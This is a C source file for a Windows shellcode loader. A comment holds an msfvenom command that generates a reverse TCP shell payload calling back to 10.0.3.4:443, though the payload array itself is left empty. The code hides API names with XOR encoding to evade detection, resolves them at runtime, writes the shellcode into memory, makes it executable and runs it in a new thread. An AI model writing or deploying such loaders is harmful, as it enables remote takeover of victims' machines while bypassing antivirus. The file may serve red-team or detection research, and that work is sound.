#include <windows.h>
#include <stdio.h>
#include <string.h>

// shellcode payload

unsigned char shellcode_payload[] =
//msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.3.4 LPORT=443 -f c -v shellcode_payload
// main code
unsigned int shellcode_length = sizeof(shellcode_payload);

typedef BOOL(WINAPI* pVirtualProtect)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect);

typedef LPVOID(WINAPI* pVirtualAlloc)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );

typedef HANDLE(WINAPI* pCreateThread)(
    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
    SIZE_T                  dwStackSize,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    __drv_aliasesMem LPVOID lpParameter,
    DWORD                   dwCreationFlags,
    LPDWORD                 lpThreadId
);

typedef DWORD(WINAPI* pWaitForSingleObject)(
    HANDLE hHandle,
    DWORD  dwMilliseconds
);

void XOR(char* data, size_t data_length, char* key, size_t key_length) {
    int j = 0;

    for (int i = 0;i < data_length;i++) {
        if (j == key_length - 1) {
            j = 0;
        }
        data[i] = data[i] ^ key[j];
        j++;
    }
}

// main code
int main(VOID) {

    char key[] = "mysecretkey";

    char sVirtualProtect[] = { 0x3b, 0x10, 0x01, 0x11, 0x16, 0x13, 0x09, 0x24, 0x19, 0x0a, 0x0d, 0x08, 0x1a, 0x07, 0x65, };
    char sVirtualAlloc[] = { 0x3b, 0x10, 0x01, 0x11, 0x16, 0x13, 0x09, 0x35, 0x07, 0x09, 0x16, 0x0e, 0x79, };
    char sCreateThread[] = { 0x2e, 0x0b, 0x16, 0x04, 0x17, 0x17, 0x31, 0x1c, 0x19, 0x00, 0x18, 0x09, 0x79, };
    char sWaitForSingleObject[] = { 0x3a, 0x18, 0x1a, 0x11, 0x25, 0x1d, 0x17, 0x27, 0x02, 0x0b, 0x1e, 0x01, 0x1c, 0x3c, 0x07, 0x09, 0x17, 0x06, 0x00, 0x6b, };

    HMODULE kernel32Module = GetModuleHandleA("kernel32.dll");

    XOR((char*)sVirtualAlloc, sizeof(sVirtualAlloc), key, sizeof(key));
    // allocate the memory
    pVirtualAlloc va = (pVirtualAlloc)GetProcAddress(kernel32Module, sVirtualAlloc);
    LPVOID memory_address = va(
        NULL,
        shellcode_length,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    XOR((char*)sVirtualProtect, sizeof(sVirtualProtect), key, sizeof(key));

    // load the shellcode in the memory

    RtlMoveMemory(
        memory_address, shellcode_payload, shellcode_length
    );

    // make shellcode executable
    DWORD old_protection = 0;


    pVirtualProtect vp = (pVirtualProtect)GetProcAddress(kernel32Module, sVirtualProtect);

    BOOL returned_vp = vp(
        memory_address,
        shellcode_length,
        PAGE_EXECUTE_READ,
        &old_protection
    );

    // execute thread
    if (returned_vp != NULL) {
        XOR((char*)sCreateThread, sizeof(sCreateThread), key, sizeof(key));
        pCreateThread ct = (pCreateThread)GetProcAddress(kernel32Module, sCreateThread);
        HANDLE thread_handle = ct(
            NULL,
            NULL,
            (LPTHREAD_START_ROUTINE)memory_address,
            NULL, NULL, NULL
        );

        // wait for thread to complete
        XOR((char*)sWaitForSingleObject, sizeof(sWaitForSingleObject), key, sizeof(key));
        pWaitForSingleObject wso = (pWaitForSingleObject)GetProcAddress(kernel32Module, sWaitForSingleObject);
        wso(
            thread_handle,
            INFINITE
        );
    }
}
